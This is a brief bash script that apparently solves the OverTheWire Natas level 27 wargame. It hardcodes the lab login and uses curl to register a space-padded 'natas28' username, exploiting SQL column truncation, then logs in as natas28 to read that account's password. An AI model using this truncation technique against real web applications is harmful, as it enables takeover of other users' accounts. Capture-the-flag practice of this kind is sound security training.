
natas27_(){
	user_pass="natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"
	url="http://natas27.natas.labs.overthewire.org/"
	username1="natas28$(printf ' %.0s' {1..100})a"
	username2="natas28"
	_=$(curl -isu $user_pass $url -F username="$username1" -F password="")
	val=$(curl -isu $user_pass $url -F username="$username2" -F password="")

	echo "$val"
}


